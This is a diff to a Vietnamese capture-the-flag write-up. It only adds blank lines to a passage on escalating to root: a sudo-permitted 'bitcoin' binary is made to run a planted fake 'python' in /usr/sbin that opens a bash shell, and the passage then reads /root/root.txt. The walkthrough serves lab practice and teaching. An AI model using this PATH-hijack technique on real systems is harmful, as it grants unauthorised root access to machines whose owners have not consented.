@@ -151,15 +151,21 @@ sudo -l
 Xem thư mục chứa chương trình và nội dung script kèm theo:
 
 ls -la /home/Orka/Desktop
+
 cat /home/Orka/Desktop/transfer.py
+
 file /home/Orka/Desktop/bitcoin
+
 strings /home/Orka/Desktop/bitcoin | sed -n '1,200p'
 
 File transfer.py có đoạn quan trọng:
 
 result = sys.argv[1]
+
 print "Saving " + result + " BitCoin(s) For Later Use "
+
 test = raw_input("Do you want to make a transfer? Y/N : ")
+
 if test == "Y":
 
 Điều này gợi ý bitcoin gọi Python để chạy transfer.py.
@@ -168,11 +174,15 @@ Kiểm tra PATH:
 
 echo $PATH
 ls -la /usr/sbin   # kiểm tra xem bạn có quyền ghi ở đây không
+
 Tạo một file python giả (trong ví dụ ta đặt ở /usr/sbin) để khi được chạy sẽ mở shell:
 
 cd /usr/sbin
+
 echo -e '#!/bin/bash\n/bin/bash' > python
+
 chmod +x python
+
 ls -l /usr/sbin/python
 
 hạy binary được phép bởi sudo:
@@ -182,8 +192,11 @@ sudo /home/Orka/Desktop/bitcoin
 Xác minh đã lên root:
 
 whoami    # output: root
+
 id
+
 ls /root
+
 cat /root/root.txt
 
 <img width="712" height="540" alt="image" src="https://github.com/user-attachments/assets/f28b23d4-cf3e-4dda-8ad4-90643cde8071" />
